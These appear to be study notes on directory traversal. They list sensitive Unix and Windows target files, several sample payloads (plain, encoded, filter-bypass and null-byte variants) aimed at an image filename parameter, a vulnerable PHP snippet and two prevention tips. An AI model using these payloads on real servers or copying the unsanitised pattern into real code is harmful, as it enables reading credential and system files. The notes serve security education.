
What is directory traversal?
> Directory traversal (also known as file path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application. This might include application code and data, credentials for back-end systems, and sensitive operating system files. In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.



Target
- For Unix-based operating systems
    - /etc/passwd           Contains information about all the user’s account
    - /etc/group            Contains groups to which users belong
    - /etc/profile          Contains default variables for users
    - /proc/self/environ    Contains certain environmental variables
    - /etc/issue            Contains message to be displayed before the login
    - /proc/version         Contains the Linux kernel version in use
    - /proc/cpuinfo         Contains the processor information

- For Windows Operating systems
    - C:\Windows\repair\system
    - C:\Windows\repair\SAM
    - C:\Windows\win.ini
    - C:\boot.ini
    - C:\Windows\system32\config\AppEvent.Evt


Sample
- <img src="/loadImage?filename=218.png">
- /var/www/images/218.png
- linux         
    - GET /image/loadImage?filename=../../../etc/passwd
    - GET /image/loadImage?filename=/etc/passwd
    - GET /image?filename=....//....//....//etc/passwd
    - GET /image?filename=..%252f..%252f..%252fetc/passwd
    - GET /image?filename=/var/www/images/../../../etc/passwd
    - GET /image?filename=../../../etc/passwd%00.png
- windows      
    - https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini


A typical example of a vulnerable PHP code is:
```php
<?php
	$file = $_GET['page'];          //The page we want to display
?>
```
How to prevent a directory traversal attack
- Sanitize Filename Parameters
- Principle of Least Privilege